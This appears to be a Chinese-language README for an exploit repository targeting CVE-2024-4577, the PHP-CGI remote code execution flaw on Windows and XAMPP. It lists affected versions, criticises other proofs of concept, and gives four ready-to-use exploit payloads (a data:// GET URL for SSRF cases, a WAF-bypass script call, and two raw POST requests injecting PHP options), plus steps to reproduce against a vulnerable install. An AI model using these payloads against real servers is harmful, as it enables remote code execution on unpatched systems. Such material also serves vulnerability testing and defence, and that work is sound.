# CVE-2024-4577-PHP-RCE

## 项目简介

- 全球首款利用PHP默认环境（XAMPP）的CVE-2024-4577 PHP-CGI RCE 漏洞 EXP。
- 实现PHP默认环境RCE。原理：```cgi.force_redirect``` + ```REDIRECT-STATUS```。
- 新增原创EXP，支持SSRF场景的打法。原理：data://协议 + GET请求。
- 新增原创EXP，支持绕过WAF场景的打法（无需使用到allow_url_include、auto_prepend_file、auto_append_file）。原理：建立FastCGI服务端 + FastCGI协议通讯。

## 吐槽

- 本不想发起这个仓库的，但发现目前安全行业太浮躁，文章乱发预警乱发，看到权威公众号就跟着乱转，无语。
- 乱转的POC均无法使用，需要人工编辑配置文件并在特定位置插入特定配置，却在正文说默认环境，无语。
- 因为不懂原理，提供的WAF拦截规则缺少 ```cgi.force_redirect``` 和 ```REDIRECT-STATUS```，无语。
- 因为不懂原理，提供的WAF拦截规则只有 ```allow_url_include``` 和 ```auto_prepend_file```，无语。
- Github很多CVE-2024-4577的POC都是缺少 ```cgi.force_redirect``` 和 ```REDIRECT-STATUS```，无语。
- Github很多CVE-2024-4577的POC都是执行echo("test")，然后判断返回了test字符串就认为有漏洞，无语。

## 漏洞简介

| 信息 | 内容 |
| --- | --- |
| 漏洞名称 | PHP RCE |
| 漏洞编号 | CVE-2024-4577 |
| 风险等级 | 高危 |
| 漏洞类型 | RCE |
| 利用难度 | 低 |

## 影响版本

- [PHP Windows版](https://www.php.net/) 8.3.0 <= 影响版本 < 8.3.8
- [PHP Windows版](https://www.php.net/) 8.2.0 <= 影响版本 < 8.2.20
- [PHP Windows版](https://www.php.net/) 8.1.0 <= 影响版本 < 8.1.29
- [PHP Windows版](https://www.php.net/) 影响版本理论上包括 8.0.x 和 7.x 和 5.x
- [XAMPP Windows版](https://www.apachefriends.org/) 影响版本 <= 8.2.12
- [XAMPP Windows版](https://www.apachefriends.org/) 影响版本 <= 8.1.25
- [XAMPP Windows版](https://www.apachefriends.org/) 影响版本 <= 8.0.30

## EXP 1

可用于SSRF场景:
```
http://PhpVulnEnv/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"
```

## EXP 2

可用于绕过WAF场景:
```
python3 CVE-2024-4577-PHP-RCE.py 127.0.0.1
```

## EXP 3

```
POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: PhpVulnEnv

<?php die("Te"."sT");?>
```

## EXP 4

```
POST /php-cgi/php-cgi.exe?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: PhpVulnEnv
REDIRECT-STATUS: XCANWIN

<?php die("Te"."sT");?>
```

## 复现

1. 服务端环境：

```
XAMPP Windows版 8.2.12
```

2. 服务端下载并安装 XAMPP：

```
https://zenlayer.dl.sourceforge.net/project/xampp/XAMPP%20Windows/8.2.12/xampp-windows-x64-8.2.12-0-VS16-installer.exe?viasf=1

或者自主去这里挑受影响版本：https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/

```

3. 客户端使用EXP

```
使用上述EXP进行测试
```

4. 验证

```
判断是否返回 TesT
```
